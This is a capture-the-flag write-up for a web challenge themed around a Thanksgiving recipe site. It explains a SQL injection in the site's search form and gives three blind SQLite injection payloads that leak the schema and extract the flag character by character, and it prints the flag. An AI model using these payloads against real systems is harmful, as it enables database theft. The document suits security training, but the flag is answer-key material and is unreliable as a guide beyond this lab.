# Web 300-3 - The Color Drained from His Face
## Description
If you're in the USA then you know that we had a holiday this week. We call it Thanksgiving, and while its original meaning is ultimately a dark tale, we've given the holiday new meaning in the from of a time of observance and reflection upon all of the things in our lives that we appreciate. We express gratitude for the things that keep us going, make things possible, and give us meaning.

Except most people in the world aren't that insightful or perceptive, and generally feel entitled to things. So really it's about violent Black Friday shopping, hating your family, and watching sports that inexplicably play on that day.

Of course, the most important thing Thanksgiving is about: Overindulging. Though I have to admit, I've got a pretty awesome recipe. The key is the stuffing. See, I take some normal sage stuffing, quinoa, and lemon juice and I mix it all up into a wet paste. Really get a union of flavors together. Then I inject that stuff right on up there into the turkey. Really get it in there because turkeys get these little hidden spots that you might not see from just looking. The lemon really gives the turkey a delightful scent of industrial cleaning solution that kids really love.

Feel free to try it out for yourself. I got the recipe from Thanksgiving Delights. They seem to also have a lot of other *recipes* for your *table*.

[We Give Thanks To You, Watcher](http://34.135.223.176:1928/)

## Solution
The `search` (POST) query is vulnerable to SQL injection.

First, leak the database structure (character per character) using the query ```foo' or (SELECT CASE WHEN ((SUBSTR((SELECT sql FROM sqlite_schema),$IDX,1) == "$CHR")) THEN "1" ELSE "0" END)="1" -- ```
```CREATE TABLE recipes         id INTEGER PRIMARY KEY,        title TEXT NOT NULL,        content TEXT NOT NULL,        ingredients TEXT,        instructions TEXT,        flag TEXT     ```

Now that we know there is a `flag` column in the recipes table, find the `id` of the recipe which contains the flag:
```foo' or (SELECT CASE WHEN (SUBSTR((select flag from recipes where id = 8), 1, 1)="p") THEN "1" ELSE "0" END)="1" --```

Finally, leak the flag:
```foo' or (SELECT CASE WHEN ((SUBSTR((select flag from recipes where id = 8), $IDX, 1)= "$CHR")) THEN "1" ELSE "0" END)="1" -- ```

## Flag
`poctf{uwsp_7h3_5leep3r_mu57_4w4k3n}`
